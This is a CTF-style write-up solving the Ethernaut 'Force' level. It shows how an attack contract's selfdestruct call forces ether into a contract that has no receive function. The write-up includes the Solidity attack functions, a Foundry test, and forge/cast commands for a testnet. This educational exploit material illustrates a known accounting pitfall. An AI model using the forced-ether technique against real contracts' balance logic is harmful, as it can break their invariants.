## 🎯 Objective:

- This is contracts objective is to fund Ether with some ether:
- The balance of the contract should be more than 0.
	- address(this).balance > 0;
---
## 📄Contracts Overview

### `Force`
- The Force.sol is a empty contract with no function. But still it have the capability to store Ether. Cause all contract store ether.

---

## 🧠Vulnerability: Force

- The core vulnerability of this contract is that it receive's the ether from the other contracts without any `receive()` and `fallback()` function.
- `address(this).balance` is an unreliable state for accounting
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Force { /*
MEOW ?
	/\_/\ /
____/ o o \
/~____ =ø= /
(______)__m_m)
			*/ }
```

- The question is if this contract does not have any function. HOW ?

##  Attack Flow:

- In order to achieve the goal or to make this contracts balance more than 0.
- So a `smoking gun`  can be used:
	- `selfdestruct()`

## SelfDestruct a Smoking Gun

- This is a way to transfer the total balance of a Contract to a destined Contract.
- SelfDestruct is used to delete the smart contract from the blockchain and send all its balance to the another contract.
- `selfdestruct(payable(address(target)));`

## Attack Flow

- So the solution is to use  `selfdestruct()` 
```attack flow
Attacker
| contract AttackForce{}
V
Makes a Attack contract that have a deposit() function which will collect the depoist of the attacker it can be {0.15} or less but should not equals to 0.
|
| function deposit() payable{ balance+=msg.value }
V
Then it uses the address of the Target contract as the parameter
|
| address payable addr = payable(address(force));
V
After populating the ether in the attack contract then calling the attack function in which selfdestruct() is written.
|
| 
V
It will delete the attack contract from the blockchain send all the funds to the 
Target contract
```
- Even though the contract does not have any receive function this can be a way to send ether without any receive function.
---

- ## 🧪 Test - TestForce.t.sol

| testName                            | What it checks                                                                                                                 |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| testexploitBalanceAfterSelfDestruct | It checks the initial balance of Force contract and after attack function is run them it checks the balance of Force contract. |
### Key exploit line (in test):

```solidity 
attack.deposit{value: 2 ether}();
console.log("The balance of the contract Attack: ", address(attack).balance);
attack.attack();
finalForceBalance = address(force).balance;
console.log("The initial Balance of Contract force is: ", finalForceBalance);
``` 
- The attack() function from AttackForce contract forces the Attack contract to delete itself and Sends the total balance to the Force Contract.

``` solidity
function deposit() external payable{

	require(msg.value > 0, "should be greater than 0");
	s_userBalance[msg.sender]+=msg.value;
	balance+=msg.value;

}
function attack() public payable {

	address payable addr = payable(address(force));
	selfdestruct(addr);
}
```

---

## 🚀On-Chain - AttackForceScrip.s.sol

This script contract exploit the Force contract on On Chain.

```solidity
function deposit() external {

	vm.startBroadcast();
	attack.deposit{value: 0.015 ether}();
	vm.stopBroadcast();

}
function attack1() external{

	vm.startBroadcast();
	attack.attack();
	vm.stopBroadcast();

}
```

After deploying this contract interact with function to exploit the Force Contract and send ether to it.

---
## 🛠 How to Run
### Run Tests (Local Anvil)

```bash
forge test --mt testexploitBalanceAfterSelfDestruct -vvv
```

### Deploy & Attack (On-chain)

```bash
forge script script/AttackForceScript.s.sol --rpc-url $RPC_SEPOLLIA_URL --private-key $PRIVATE_KEY --broadcast
```

```bash
cast send <Contract_address> "deposit()" --value <Value_of_ether> --rpc-url $RPC_SEPOLLIA_URL --private-key $PRIVATE_KEY
```

```bash
cast send <Contract_address> "attack()" --value <Value_of_ether> --rpc-url $RPC_SEPOLLIA_URL --private-key $PRIVATE_KEY
```
- `cast` a foundry tool used to interact with the deployed smartContract.

---
## 📁 Project Structure

```
├── src/
│   └──Force.sol
|	└──AttackForce.sol        # deposit() + attack() function contract.
├── script/
│   ├── DeployScrip.s.sol
│   └── AttackForceScript.s.sol
└── test/
    └── TestForce.t.sol
```
